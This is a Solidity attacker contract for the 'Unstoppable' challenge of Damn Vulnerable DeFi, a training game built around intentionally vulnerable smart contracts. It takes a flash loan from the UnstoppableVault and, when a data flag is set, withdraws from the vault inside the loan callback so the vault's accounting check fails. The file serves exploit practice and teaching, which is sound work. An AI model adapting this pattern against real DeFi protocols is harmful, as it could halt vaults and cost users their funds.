// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solmate/src/auth/Owned.sol";
import {UnstoppableVault, ERC20} from "../unstoppable/UnstoppableVault.sol";

/**
 * @title ReceiverUnstoppableAttacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverUnstoppableAttacker is Owned, IERC3156FlashBorrower {
    UnstoppableVault private immutable pool;

    error UnexpectedFlashLoan();

    constructor(address poolAddress) Owned(msg.sender) {
        pool = UnstoppableVault(poolAddress);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        if (
            initiator != address(this) ||
            msg.sender != address(pool) ||
            token != address(pool.asset()) ||
            fee != 0
        ) revert UnexpectedFlashLoan();

        ERC20(token).approve(address(pool), amount);
        // NB: attack if data exist (as a flag)
        if (data.length > 0) {
            pool.withdraw(
                abi.decode(data, (uint256)),
                address(this),
                address(this)
            );
        }

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        address asset = address(pool.asset());
        pool.flashLoan(this, asset, amount, bytes(""));
    }

    function executeFlashLoanAttack(
        uint256 _amount,
        uint256 _withdrawAmount
    ) external onlyOwner {
        address asset = address(pool.asset());
        pool.flashLoan(
            this,
            asset,
            _amount,
            bytes(abi.encode(_withdrawAmount))
        );
    }
}
